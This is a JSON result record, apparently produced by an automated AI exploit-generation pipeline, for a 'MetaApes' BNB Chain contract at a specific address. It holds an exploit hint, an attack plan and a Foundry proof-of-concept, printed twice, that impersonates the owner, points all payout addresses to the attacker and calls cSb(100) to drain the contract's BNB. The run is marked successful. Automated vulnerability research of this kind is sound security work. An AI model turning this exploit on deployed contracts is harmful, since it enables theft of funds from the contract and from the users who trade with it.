@@ -1,0 +1,55 @@
+{
+  "project_id": "MetaApes_0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+  "target_address": "0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner or have authorized privileges",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner or authorized address, call the cSb() function with a high percentage (e.g., 100) to drain all BNB from the contract to the tfU address (which can be set to attacker's address via setrecadd()). Alternatively, use approvals() to transfer BNB to krhF, mdhS, wthT, and extR addresses (which can also be set to attacker-controlled addresses). First ensure the contract has BNB balance by having users trade tokens or directly sending BNB to the contract."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface MetaApesBSC {\n    function getOwner() external view returns (address);\n    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;\n    function cSb(uint256 aP) external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed beyond the template\n        // The template already defines TARGET and attacker\n        // We'll need to find the owner address first\n        address owner = MetaApesBSC(TARGET).getOwner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Send some BNB to the contract first\n        uint256 initialContractBalance = 10 ether;\n        deal(TARGET, initialContractBalance);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialBalance = address(this).balance;\n        // Step 1: Get the owner address\n        address owner = MetaApesBSC(TARGET).getOwner();\n        \n        // Step 2: Impersonate the owner (who is authorized)\n        vm.startPrank(owner);\n        \n        // Step 3: Set all recipient addresses to attacker's address\n        MetaApesBSC(TARGET).setrecadd(\n            attacker,  // mkwA\n            attacker,  // krhF\n            attacker,  // mdhS\n            attacker,  // wthT\n            attacker,  // extR\n            attacker,  // bbaK\n            attacker   // tfU\n        );\n        \n        // Step 4: Drain 100% of BNB using cSb(100)\n        MetaApesBSC(TARGET).cSb(100);\n        \n        vm.stopPrank();\n        \n        // Step 5: Verify attacker's balance increased\n        uint256 attackerBalanceAfter = attacker.balance;\n        assertGt(attackerBalanceAfter, 0, \"Attacker should have received BNB\");\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The MetaApesBSC contract has owner-only functions that allow draining BNB from the contract. The cSb() function transfers a percentage of contract BNB to tfU address, and approvals() transfers BNB to krhF, mdhS, wthT, extR addresses. These recipient addresses can be set via setrecadd() function. An authorized attacker can set these addresses to their own address and drain all BNB.",
+      "attack_strategy": "1. Impersonate an authorized address (owner or authorized account). 2. Send BNB to the contract to give it a balance. 3. Use setrecadd() to set all recipient addresses to attacker's address. 4. Call cSb(100) to drain 100% of BNB to attacker.",
+      "step_by_step_plan": "1. Use vm.prank() to impersonate an authorized address (we need to find the owner first). 2. Send BNB to the contract using deal() or direct transfer. 3. Call setrecadd() with attacker address for all parameters. 4. Call cSb(100) to drain all BNB. 5. Verify attacker's BNB balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface MetaApesBSC {\n    function getOwner() external view returns (address);\n    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;\n    function cSb(uint256 aP) external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed beyond the template\n        // The template already defines TARGET and attacker\n        // We'll need to find the owner address first\n        address owner = MetaApesBSC(TARGET).getOwner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Send some BNB to the contract first\n        uint256 initialContractBalance = 10 ether;\n        deal(TARGET, initialContractBalance);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialBalance = address(this).balance;\n        // Step 1: Get the owner address\n        address owner = MetaApesBSC(TARGET).getOwner();\n        \n        // Step 2: Impersonate the owner (who is authorized)\n        vm.startPrank(owner);\n        \n        // Step 3: Set all recipient addresses to attacker's address\n        MetaApesBSC(TARGET).setrecadd(\n            attacker,  // mkwA\n            attacker,  // krhF\n            attacker,  // mdhS\n            attacker,  // wthT\n            attacker,  // extR\n            attacker,  // bbaK\n            attacker   // tfU\n        );\n        \n        // Step 4: Drain 100% of BNB using cSb(100)\n        MetaApesBSC(TARGET).cSb(100);\n        \n        vm.stopPrank();\n        \n        // Step 5: Verify attacker's balance increased\n        uint256 attackerBalanceAfter = attacker.balance;\n        assertGt(attackerBalanceAfter, 0, \"Attacker should have received BNB\");\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 56.614378929138184,
+      "prompt_tokens": 36860,
+      "completion_tokens": 934,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 56.61860203742981,
+  "total_prompt_tokens": 36860,
+  "total_completion_tokens": 934,
+  "total_cost": 0.0
+}
